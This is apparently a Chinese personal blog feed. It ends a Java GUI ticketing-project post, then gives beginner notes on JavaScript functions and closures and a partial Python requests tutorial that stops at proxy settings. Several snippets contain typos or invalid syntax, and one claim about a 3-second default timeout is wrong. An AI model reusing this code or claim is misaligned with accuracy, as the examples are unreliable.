<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写这个GUI的过程遇到了很多的问题，越做到后面越感觉力不从心，因为我觉得我一开始的草稿没有写好，每个数据库里的表的结构没有协调好，因为一个功能(比如购票、退票等等)会牵扯到很多数据表牵一发而动全身，比如购票之后会在paid表里加一条数据，然后passenger表也要相应的加一条数据，但是这个联动没有做好，导致可能购票成功之后只在paid表里加了数据，passenger表没有加上，所以最后我修改了一些东西，把passenger表里的好多列都删了。</p>
<p>写完之后感觉还有很多优化的点，比如购买了没有的车次要怎么处理，查询没有的车号要怎么处理等等，以及表的结构也有很多问题，基本的功能实现了，但是觉得写的非常烂，还有很大的提升空间。</p>
<p>所以总结下来就是前期准备工作很重要，要提前想好每个表要有哪些字段，才可以完美地实现需要的功能。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>链接：<a href="https://pan.baidu.com/s/1yOZf_D4k8T91tw1ol_Lo5Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1yOZf_D4k8T91tw1ol_Lo5Q</a><br>提取码：xcsy </p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>这个Java的GUI感觉可以写一些小工具，之前ctf做misc题的时候用到的很多工具(比如Stegsolve等等)可能就是用Java的GUI来写的把，以后有想法的话可以自己做一些小工具，感觉挺好玩的。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/cnds123/article/details/103237529" target="_blank" rel="noopener">https://blog.csdn.net/cnds123/article/details/103237529</a></p>
<p><a href="https://blog.csdn.net/yerenyuan_pku/article/details/82861589" target="_blank" rel="noopener">https://blog.csdn.net/yerenyuan_pku/article/details/82861589</a></p>
<p><a href="https://www.zhihu.com/question/43581628" target="_blank" rel="noopener">https://www.zhihu.com/question/43581628</a></p>
<p><a href="https://www.cnblogs.com/yaochc/p/4957833.html" target="_blank" rel="noopener">https://www.cnblogs.com/yaochc/p/4957833.html</a></p>
<p><a href="https://www.php.cn/mysql-tutorials-418692.html" target="_blank" rel="noopener">https://www.php.cn/mysql-tutorials-418692.html</a></p>
<p><a href="https://blog.csdn.net/weixin_45179130/article/details/90761966" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45179130/article/details/90761966</a></p>
<p><a href="https://juejin.cn/post/6844904036106256397" target="_blank" rel="noopener">https://juejin.cn/post/6844904036106256397</a></p>
<p><a href="https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be" target="_blank" rel="noopener">https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be</a></p>
<p><a href="https://www.cnblogs.com/iyangyuan/p/4809494.html" target="_blank" rel="noopener">https://www.cnblogs.com/iyangyuan/p/4809494.html</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript函数学习笔记</title>
    <url>/2021/04/15/JavaScript-function/</url>
    <content><![CDATA[<p>学完基础，再学一下函数相关内容<a id="more"></a></p>
<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><h3 id="JavaScript函数定义"><a href="#JavaScript函数定义" class="headerlink" title="JavaScript函数定义"></a>JavaScript函数定义</h3><p>用<code>function</code>定义函数，函数可以通过声明定义，也可以是一个表达式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function functionname(parameters)&#123;</span><br><span class="line">	执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数表达式可以放在变量里，该变量可以作为函数使用，这样的函数也叫匿名函数(函数没有名字)，通过变量名来调用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; function(a,b)&#123;return a*b&#125;;</span><br><span class="line">var a &#x3D; x(1,2);</span><br></pre></td></tr></table></figure>

<h3 id="Function-构造函数"><a href="#Function-构造函数" class="headerlink" title="Function()构造函数"></a>Function()构造函数</h3><p>除了用<code>function</code>关键字来定义函数，还可以用内置的JavaScript函数构造器<code>Function()</code>定义函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var myfunction &#x3D; new Function(&quot;a&quot;,&quot;b&quot;,&quot;return a*b&quot;);</span><br><span class="line">var x &#x3D; myfunction(1,2);</span><br></pre></td></tr></table></figure>

<p>这个构造函数和上面定义的一样，因为JavaScript要避免用<code>new</code>关键字，所以感觉这个构造函数有点鸡肋</p>
<h3 id="函数提升-Hoisting"><a href="#函数提升-Hoisting" class="headerlink" title="函数提升(Hoisting)"></a>函数提升(Hoisting)</h3><p>变量和函数的声明会被JavaScript解释器提升到最顶部，所以变量和函数可以在声明前使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(1,2);</span><br><span class="line">function add(a,b)&#123;</span><br><span class="line">	return a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>匿名函数无法提升</p>
<h3 id="自调用函数"><a href="#自调用函数" class="headerlink" title="自调用函数"></a>自调用函数</h3><p>自调用函数会自动调用，不能自调用声明的函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">	var x &#x3D; &quot;hello world&quot;;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>它实际上是匿名函数的自我调用</p>
<h3 id="函数是对象"><a href="#函数是对象" class="headerlink" title="函数是对象"></a>函数是对象</h3><p>用<code>typeof</code>判断函数类型会返回”function”，但把函数描述为一个对象更加准确，函数有属性和方法。</p>
<p>arguments.length属性返回函数调用时接收到的参数个数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add(a,b)&#123;</span><br><span class="line">	reutnr arguments.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>toString()方法将函数作为一个字符串返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add(a,b)&#123;</span><br><span class="line">	return a+b;</span><br><span class="line">&#125;</span><br><span class="line">var txt&#x3D;add.toString();</span><br></pre></td></tr></table></figure>

<p> 函数定义作为对象的属性，称之为对象方法。（这个我不太理解，先记住再说</p>
<h3 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h3><p>ES6新增了箭头函数，箭头函数的语法更简洁：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(参数1, 参数2, …, 参数N) &#x3D;&gt; &#123; 函数声明 &#125;</span><br><span class="line"></span><br><span class="line">(参数1, 参数2, …, 参数N) &#x3D;&gt; 表达式(单一)</span><br><span class="line">&#x2F;&#x2F; 相当于：(参数1, 参数2, …, 参数N) &#x3D;&gt;&#123; return 表达式; &#125;</span><br></pre></td></tr></table></figure>

<p>只有一个参数时，圆括号是可选的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(单一参数) &#x3D;&gt; &#123;函数声明&#125;</span><br><span class="line">单一参数 &#x3D;&gt; &#123;函数声明&#125;</span><br></pre></td></tr></table></figure>

<p>没有参数的函数应该写成一对圆括号:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">() &#x3D;&gt; &#123;函数声明&#125;</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; ES5</span><br><span class="line">var x &#x3D; function(x, y) &#123;</span><br><span class="line">     return x * y;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; ES6</span><br><span class="line">const x &#x3D; (x, y) &#x3D;&gt; x * y;</span><br></pre></td></tr></table></figure>

<p>有的箭头函数都没有自己的this。 不适合定义一个对象的方法。</p>
<p>当我们使用箭头函数的时候，箭头函数会默认帮我们绑定外层 this 的值，所以在箭头函数中 this 的值和外层的 this 是一样的。</p>
<p>箭头函数是不能提升的，所以需要在使用之前定义。</p>
<p>使用 const 比使用 var 更安全，因为函数表达式始终是一个常量。</p>
<p>如果函数部分只是一个语句，则可以省略 return 关键字和大括号 {}，这样做是一个比较好的习惯:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const x &#x3D; (x, y) &#x3D;&gt; &#123; return x * y &#125;;</span><br><span class="line">&#x2F;&#x2F;相当于:</span><br><span class="line">const x &#x3D; (x, y) &#x3D;&gt;  x*y;</span><br></pre></td></tr></table></figure>

<h2 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h2><p>JavaScript函数对参数不做任何检查</p>
<h3 id="参数规则"><a href="#参数规则" class="headerlink" title="参数规则"></a>参数规则</h3><p>函数定义时形参不指定数据类型</p>
<p>函数对实参没有类型检测，对实参的个数也没有检测</p>
<h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><p>ES5中如果函数调用不给实参，参数默认为<code>undefined</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add(a,b)&#123;</span><br><span class="line">	if(b&#x3D;&#x3D;undefined) b&#x3D;0;</span><br><span class="line">	return a+b;	</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;或者写成下面这样</span><br><span class="line">function add(a,b)&#123;</span><br><span class="line">	b&#x3D;b||0;</span><br><span class="line">	return a+b;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;如果b有实参，b||0返回b，因为b是true，否则返回0，因为undefined是false</span><br></pre></td></tr></table></figure>

<p>如果函数调用时设置了过多的参数，参数将无法被引用，因为无法找到对应的参数名。 只能使用 arguments 对象来调用。</p>
<p>ES6函数可以设置默认参数，判断undefined或者||操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add(a,b&#x3D;10)&#123;</span><br><span class="line">	&#x2F;&#x2F;b&#x3D;10 if not passed or undefined</span><br><span class="line">	return a+b;</span><br><span class="line">&#125;</span><br><span class="line">add(1,2);&#x2F;&#x2F;输出3</span><br><span class="line">add(1);&#x2F;&#x2F;输出11</span><br></pre></td></tr></table></figure>

<h3 id="arguments对象"><a href="#arguments对象" class="headerlink" title="arguments对象"></a>arguments对象</h3><p>函数有个内置的arguments对象，包含了函数调用时的参数数组，通过这种方式可以很方便的找到参数里的最大值或者求和：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function findmax()&#123;</span><br><span class="line">	var i,max&#x3D;arguments[0];</span><br><span class="line">	if(arguments.length&#x3D;&#x3D;1) return max;</span><br><span class="line">	for(i&#x3D;1;i&lt;arguments.length;i++)&#123;</span><br><span class="line">		if(arguments[i]&gt;max) max&#x3D;arguments[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sum()&#123;</span><br><span class="line">	var i,sum&#x3D;0;</span><br><span class="line">	for(i&#x3D;0;i&lt;arguments.length;i++)&#123;</span><br><span class="line">		sum+&#x3D;arguments[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参数相关"><a href="#参数相关" class="headerlink" title="参数相关"></a>参数相关</h3><p>函数调用时如果引用对象的值，那么函数内修改对象的属性会作用于函数外，修改对象属性在函数外是可见的，相当于C语言的引用。</p>
<h2 id="JavaScript函数调用"><a href="#JavaScript函数调用" class="headerlink" title="JavaScript函数调用"></a>JavaScript函数调用</h2><p>JavaScript 函数有 4 种调用方式。</p>
<p>每种方式的不同在于 this 的初始化。</p>
<h3 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h3><p>this指向当前对象</p>
<h3 id="作为函数调用"><a href="#作为函数调用" class="headerlink" title="作为函数调用"></a>作为函数调用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add(a,b)&#123;</span><br><span class="line">	return a+b;</span><br><span class="line">&#125;</span><br><span class="line">add(1,2);</span><br></pre></td></tr></table></figure>

<p>这个函数不属于任何对象，但是它是默认的全局对象，在HTML中默认的全局对象是HTML页面，所以函数属于HTML页面，在浏览器中的页面对象是浏览器窗口(window对象)，所以它也是window对象的函数，所以可以用<code>window.add(1,2)</code>来调用函数。</p>
<h3 id="函数作为方法调用"><a href="#函数作为方法调用" class="headerlink" title="函数作为方法调用"></a>函数作为方法调用</h3><p>JavaScript可以将函数定义为对象的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var myName&#x3D;&#123;</span><br><span class="line">	firstName&#x3D;&#39;tian&#39;,</span><br><span class="line">	lastName&#x3D;&#39;ze&#39;,</span><br><span class="line">	fullName: function()&#123;</span><br><span class="line">		return this.firstName+&quot; &quot;+this.lastName;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">myName.fullName();</span><br></pre></td></tr></table></figure>

<p>对象方法调用函数时，this指向该对象</p>
<h3 id="用构造函数调用函数"><a href="#用构造函数调用函数" class="headerlink" title="用构造函数调用函数"></a>用构造函数调用函数</h3><p>函数调用前用<code>new</code>关键字调用构造函数，构造函数的调用会创建一个新的对象，新对象会继承构造函数的属性和方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function name(arg1,arg2)&#123;</span><br><span class="line">	this.firstName&#x3D;arg1;</span><br><span class="line">	this.lastName&#x3D;arg2;</span><br><span class="line">&#125;</span><br><span class="line">var a&#x3D;new name(&quot;Tian&quot;,&quot;ze&quot;);</span><br><span class="line">x.firstName; &#x2F;&#x2F;返回&quot;Tian&quot;</span><br></pre></td></tr></table></figure>

<h3 id="函数方法调用函数"><a href="#函数方法调用函数" class="headerlink" title="函数方法调用函数"></a>函数方法调用函数</h3><p>函数是对象，对象有属性和方法，<code>call()</code>和<code>apply()</code>是预定义的调用函数的两个函数方法，两个方法的第一个参数必须是对象本身。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj1;</span><br><span class="line">function add(a,b)&#123;</span><br><span class="line">	return a+b;</span><br><span class="line">&#125;</span><br><span class="line">obj1&#x3D;add.call(obj1,1,2);	&#x2F;&#x2F;返回3</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj2,myarray;</span><br><span class="line">function add(a,b)&#123;</span><br><span class="line">	return a+b;</span><br><span class="line">&#125;</span><br><span class="line">myarray&#x3D;[1,2];</span><br><span class="line">obj2&#x3D;add.apply(obj2,myarray);	&#x2F;&#x2F;返回3</span><br></pre></td></tr></table></figure>

<p>两个方法第一个参数都是对象本身，第二个参数有区别：apply传入的是一个参数数组，call直接传参。</p>
<h2 id="JavaScript闭包"><a href="#JavaScript闭包" class="headerlink" title="JavaScript闭包"></a>JavaScript闭包</h2><p>JavaScript 变量可以是局部变量或全局变量。</p>
<p>私有变量可以用到闭包。</p>
<p>函数内定义的为局部变量，函数外定义的为全局变量，在web页面中全局变量属于window对象，全局变量可以用于页面上的所有脚本。</p>
<p>注：变量声明时如果不用<code>var</code>关键字，即使在函数内定义也是全局变量</p>
<h3 id="计数器困境"><a href="#计数器困境" class="headerlink" title="计数器困境"></a>计数器困境</h3><p>使用全局变量计数器，用函数让它递增</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var counter&#x3D;0;</span><br><span class="line">function add()&#123;</span><br><span class="line">	return counter++;</span><br><span class="line">&#125;</span><br><span class="line">add();</span><br><span class="line">add();	&#x2F;&#x2F;计数器为2</span><br></pre></td></tr></table></figure>

<p>问题来了，页面上任何脚本都能改变计数器，如果在函数内声明计数器就无法实现计数的功能了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add()&#123;</span><br><span class="line">	var counter&#x3D;0;</span><br><span class="line">	return counter++;</span><br><span class="line">&#125;</span><br><span class="line">add();</span><br><span class="line">add();	&#x2F;&#x2F;本想输出2,但输出是1</span><br></pre></td></tr></table></figure>

<p>内嵌函数可以解决这个问题</p>
<h3 id="JavaScript内嵌函数"><a href="#JavaScript内嵌函数" class="headerlink" title="JavaScript内嵌函数"></a>JavaScript内嵌函数</h3><p>JavaScript函数可以访问上一层的作用域，嵌套函数可以访问上一层的函数变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add()&#123;</span><br><span class="line">	var counter&#x3D;0;</span><br><span class="line">	function plus()&#123;</span><br><span class="line">		counter++;</span><br><span class="line">	&#125;</span><br><span class="line">	plus();</span><br><span class="line">	return counter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果能在外部访问plus()函数就可以解决计数器困境，可以利用闭包做到。</p>
<h3 id="JavaScript闭包-1"><a href="#JavaScript闭包-1" class="headerlink" title="JavaScript闭包"></a>JavaScript闭包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var add&#x3D;(function ()&#123;</span><br><span class="line">	var counter&#x3D;0;	&#x2F;&#x2F;只在add赋值时执行一次</span><br><span class="line">	return function()&#123;return counter++;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line">add();</span><br><span class="line">add();	&#x2F;&#x2F;计数器为2</span><br></pre></td></tr></table></figure>

<p>变量add指定了函数自我调用的返回值</p>
<p>自我调用函数只执行一次，设置计数器为0</p>
<p>add变量可以当函数来用，它可以访问函数上一层作用域的计数器</p>
<p>这就是闭包，它使函数拥有私有变量变成可能</p>
<p>计数器受匿名函数的作用域保护，只能通过add方法修改</p>
<p>闭包这个点不是很懂，看了下面网友的一些笔记后有点明白了，闭包用于面向对象编程的”封装性”，相当于java类里面的一个公用接口，因为JavaScript没有访问修饰符所以不能创建私有属性，外部可以通过闭包访问私有属性。</p>
<blockquote>
<p>此技巧是js为其没有“访问修饰符”而创建出“私有属性”。</p>
<p>以包含面向对象编程语言的基本特征“封装性”的很妙的处理方法。</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.runoob.com/js/js-function-definition.html" target="_blank" rel="noopener">https://www.runoob.com/js/js-function-definition.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python-requests模块学习</title>
    <url>/2021/03/31/python-requests-learning/</url>
    <content><![CDATA[<h2 id="Requests模块说明"><a href="#Requests模块说明" class="headerlink" title="Requests模块说明"></a>Requests模块说明</h2><blockquote>
<p>Requests 是使用 <a href="http://cn.python-requests.org/en/latest/user/intro.html#apache2" target="_blank" rel="noopener">Apache2 Licensed</a> 许可证的 HTTP 库。用 Python 编写，真正的为人类着想。<a id="more"></a></p>
<p>Python 标准库中的 <strong>urllib2</strong> 模块提供了你所需要的大多数 HTTP 功能，但是它的 API 太渣了。它是为另一个时代、另一个互联网所创建的。它需要巨量的工作，甚至包括各种方法覆盖，来完成最简单的任务。</p>
<p>在Python的世界里，事情不应该这么麻烦。</p>
<p>Requests 使用的是 urllib3，因此继承了它的所有特性。Requests 支持 HTTP 连接保持和连接池，支持使用 cookie 保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的 URL 和 POST 数据自动编码。现代、国际化、人性化。</p>
<p>（以上转自Requests官方文档）</p>
</blockquote>
<h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><p>requests主要的的方法有7个，分别对应HTTP协议的GET、HEAD、POST、PUT、PATCH、DELETE六个+request()方法，最常用的就是get和post请求。</p>
<p>构造一个向服务器请求资源的Requests对象，返回一个包含服务器资源的Response对象。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210331210913.png" alt="image-20210331210906326"></p>
<h3 id="request方法"><a href="#request方法" class="headerlink" title="request方法"></a>request方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">request(method,url,**kwargs)</span><br><span class="line"></span><br><span class="line">method:请求方法，对应get&#x2F;put&#x2F;post等7种</span><br><span class="line">url:拟获取页面的url链接</span><br><span class="line">**kwargs:13个控制访问参数</span><br><span class="line">params:字典或字节序列，作为参数添加到url中</span><br><span class="line">data:字典、字节序列或文件对象，作为Request的内容</span><br><span class="line">json:JSON格式的数据，作为Request的内容</span><br><span class="line">headers:字典，HTTP定制头</span><br><span class="line">cookies:字典或CookieJar,Request中的cookie</span><br><span class="line">auth:元组，支持HTTP认证功能</span><br><span class="line">files:字典类型，传输文件</span><br><span class="line">timeout:设定超时时间，秒为单位</span><br><span class="line">proxies:字典类型，设定访问代理服务器，可以增加登入认证</span><br><span class="line">allow_redirects:True&#x2F;False,默认为True，重定向开关</span><br><span class="line">stream:True&#x2F;False,默认为True，获取内容立即下载</span><br><span class="line">verify:True&#x2F;False,默认为True,认证SSL证书开关</span><br><span class="line">cert:本地SSL证书路径</span><br></pre></td></tr></table></figure>

<h3 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get(url,params &#x3D; None,**kwargs)</span><br><span class="line"></span><br><span class="line">url:拟获取页面的url连接</span><br><span class="line">params:url中的额外参数，字典或字节流格式，可选</span><br><span class="line">**kwargs:12个控制访问参数，继承自request</span><br></pre></td></tr></table></figure>

<h3 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post(url,data&#x3D;None,json&#x3D;None,**kwargs)</span><br><span class="line"></span><br><span class="line">url:拟获取页面的url连接</span><br><span class="line">data:字典、字节序列或文件对象，作为Request的内容</span><br><span class="line">json:JSON格式的数据，作为Request的内容</span><br><span class="line">**kwargs:12个控制访问参数，继承自request</span><br></pre></td></tr></table></figure>

<h3 id="Response对象属性"><a href="#Response对象属性" class="headerlink" title="Response对象属性"></a>Response对象属性</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210331212057.png" alt=""></p>
<p>还有：</p>
<p>r.url:内容为请求的url</p>
<p>r.cookies:cookie信息</p>
<h3 id="Requests库的异常"><a href="#Requests库的异常" class="headerlink" title="Requests库的异常"></a>Requests库的异常</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210331220143.png" alt="image-20210331220143952"></p>
<p>还有：</p>
<p>r.raise_for_status():如果不是200，产生异常requests.HTTPError</p>
<h2 id="请求实例"><a href="#请求实例" class="headerlink" title="请求实例"></a>请求实例</h2><p>1基本的GET请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 使用 get 方式请求</span><br><span class="line">response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;tieba.baidu.com&#x2F;&#39;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p>2发送GET带参数，对变量params传入字典数据类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;</span><br><span class="line">payload &#x3D; &#123;&#39;name&#39;: &#39;Numb&#39;, &#39;author&#39;: &#39;Linkin Park&#39;&#125;</span><br><span class="line"></span><br><span class="line">response &#x3D; requests.get(url, params&#x3D;payload)</span><br><span class="line">print(response.url)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p>2.1params同时支持传入列表，达到一个变量赋两个值的效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload &#x3D; &#123;&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: [&#39;value2&#39;, &#39;value3&#39;]&#125;</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;, params&#x3D;payload)</span><br><span class="line"></span><br><span class="line">print(r.url)</span><br><span class="line"></span><br><span class="line">#输出 ： http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;value1&amp;key2&#x3D;value2&amp;key2&#x3D;value3</span><br></pre></td></tr></table></figure>

<p>3发送POST请求，使用data参数传输数据</p>
<p>3.1直接传输字典类型到data参数，作为POST请求的数据，会自动编码为表单形式发送，requests默认使用<code>application/x-www-form-urlencoded</code>对POST数据编码。如果要传递JSON数据，可以直接传入json参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;user&#39;: &#39;abc123&#39;,</span><br><span class="line">    &#39;pass&#39;: &#39;admin&#39;</span><br><span class="line">&#125;</span><br><span class="line">response &#x3D; requests.post(url, data&#x3D;data) </span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p>上传文件需要更复杂的编码格式，但是requests把它简化成<code>files</code>参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload_files &#x3D; &#123;&#39;file&#39;: open(&#39;report.xls&#39;, &#39;rb&#39;)&#125;</span><br><span class="line">r &#x3D; requests.post(url, files&#x3D;upload_files)</span><br></pre></td></tr></table></figure>

<p>3.2通过json参数传递json数据到服务器，Requests库会自动编码，这是新特性,如果还是依靠data参数传递json数据，则需要使用json模块进行数据编码再传递给data参数，复杂了一点，不推荐了吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;some&#x2F;endpoint&#39;</span><br><span class="line">payload &#x3D; &#123;&#39;some&#39;: &#39;data&#39;&#125;</span><br><span class="line">r &#x3D; requests.post(url, json&#x3D;payload)##传递json数据给json参数</span><br></pre></td></tr></table></figure>

<p>4 Request库发送get或者post请求后会得到一个response对象，这个对象包含了很多有用的属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;</span><br><span class="line"></span><br><span class="line">data &#x3D; &#123;&#39;user&#39;:&#39;abc123&#39;,&#39;passwd&#39;:&#39;admin123&#39;&#125;</span><br><span class="line"></span><br><span class="line">r &#x3D; request.post(url,data&#x3D;data)</span><br><span class="line"></span><br><span class="line">print(r.url) # 返回请求的url</span><br><span class="line">print(r.text) # 返回请求的文本字符串</span><br><span class="line">print(r.content) # 返回响应内容的二进制形式</span><br><span class="line">print(r.headers) # 返回请求头</span><br><span class="line">print(r.cookies) # 返回cookies</span><br><span class="line">print(r.status_code) # 返回请求的状态码</span><br><span class="line">print(r.encoding) # 返回从HTTP header中猜测的响应内容编码方式</span><br><span class="line">print(r.apparent_encoding) # 返回从内容中分析出的响应内容编码方法（备选编码方式）</span><br></pre></td></tr></table></figure>

<p>5 Session机制：requests库如何保持session，详细参考下面的官方代码示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; requests.Session() # 生成一个session对象</span><br><span class="line"></span><br><span class="line">s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;sessioncookie&#x2F;123456789&#39;) # 有示例网站取得sessioncookie</span><br><span class="line"></span><br><span class="line">r &#x3D; s.get(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&quot;) # 再次发送请求到示例网站，示例网站会返回你的cookie</span><br><span class="line"></span><br><span class="line">print(r.text) #由此回复证明第二次请求也带上了sessioncookie</span><br><span class="line"></span><br><span class="line"># 输出：&#39;&#123;&quot;cookies&quot;: &#123;&quot;sessioncookie&quot;: &quot;123456789&quot;&#125;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>不过需要注意，就算使用了会话，方法级别的参数也不会被跨请求保持。下面的例子只会和第一个请求发送 cookie ，而非第二个：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">r &#x3D; s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;, cookies&#x3D;&#123;&#39;from-my&#39;: &#39;browser&#39;&#125;) #使用了方法级别的参数cookies</span><br><span class="line">print(r.text)</span><br><span class="line"># &#39;&#123;&quot;cookies&quot;: &#123;&quot;from-my&quot;: &quot;browser&quot;&#125;&#125;&#39;</span><br><span class="line"></span><br><span class="line">r &#x3D; s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;) #第二次请求cookies方法设置的请求消失了</span><br><span class="line">print(r.text)</span><br><span class="line"># &#39;&#123;&quot;cookies&quot;: &#123;&#125;&#125;&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在平时网上冲浪的过程中，我们经常会遇到网络波动，这个时候，一个请求等了很久可能任然没有结果。</p>
<p>在爬虫中，一个请求很久没有结果，就会让整个项目的效率变得非常低，这个时候我们就需要对请求进行强制要求，让他必须在特定的时间内返回结果，否则就报错。</p>
</blockquote>
<p>超时参数timeout的使用方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">response &#x3D; requests.get(url, timeout&#x3D;3)  【默认是3s，这个时间有点长】</span><br></pre></td></tr></table></figure>

<p>timeout=3表示：发送请求后，3秒钟内返回响应，否则就抛出异常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;twitter.com&#39;</span><br><span class="line">response &#x3D; requests.get(url, timeout&#x3D;3)     # 设置超时时间</span><br></pre></td></tr></table></figure>

<p>结果会报错：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210331221129.png" alt="image-20210331221129704"></p>
<p>设置访问代理：</p>
